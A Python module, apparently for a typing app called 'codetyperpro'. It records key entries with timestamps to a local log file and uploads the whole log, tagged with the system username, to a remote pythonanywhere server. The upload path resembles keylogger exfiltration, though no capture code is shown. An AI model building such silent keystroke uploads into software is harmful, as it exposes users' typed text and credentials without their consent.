import uuid
import json
import os
import requests
from datetime import datetime

BASE_URL = "https://codetyperpro.pythonanywhere.com:5000/log"

def get_id():
    username = os.getenv("USER") or os.getenv("USERNAME") or "unknown_user"
    username = username.replace(' ', '_')
    id_part = uuid.uuid1().hex[:4]
    return f'{username}_{id_part}'


client_id = ""

def create_id():
    global client_id
    url = 'storage/info.json'
    
    os.makedirs(os.path.dirname(url), exist_ok=True)

    try:
        with open(url, 'r+') as file:
            try:
                data = json.load(file)
                if 'client_id' in data:
                    client_id = data['client_id']
                    return client_id
            except json.JSONDecodeError:
                pass
    except FileNotFoundError:
        pass
    
    client_id = get_id()
    with open(url, 'w') as file:
        json.dump({"client_id": client_id}, file, indent=4)
    
    return client_id


def send_to_server():
    # BASE_URL = 'http://localhost:5000/log'
    
    log_data = read_logs()
    payload = {
        "client_id": client_id,
        "log_data": log_data
    }

    try:
        res = requests.post(BASE_URL, json=payload)
        if res.status_code == 201:
            print("Success!")
            return "Success!"
    except requests.RequestException:
        pass
    
    return "Failed to send log"


last_time = "-"

def print_log(key):
    global last_time
    formatted_time = datetime.now().strftime("[%Y-%m-%d %H:%M]")
    output = key
    if last_time != formatted_time:
        output = f'\n{formatted_time} {key}'
    
    write_logs(output)
    last_time = formatted_time


def read_logs(url='storage/logs.txt'):
    output = []
    
    try:
        with open(url, 'r') as file:
            for line in file:
                output.append(line.strip())
    except FileNotFoundError:
        print(f"Error: The file '{url}' was not found.")
        return "Error: Log file not found."
    except IOError:
        print(f"Error: Could not read the file '{url}'.")
        return "Error: Unable to read log file."
    
    return "\n".join(output)

def write_logs(data, url='storage/logs.txt'):
    try:
        with open(url, 'a') as file:
            file.write(data)
    except IOError:
        print(f"Error: Could not write to the file '{url}'.")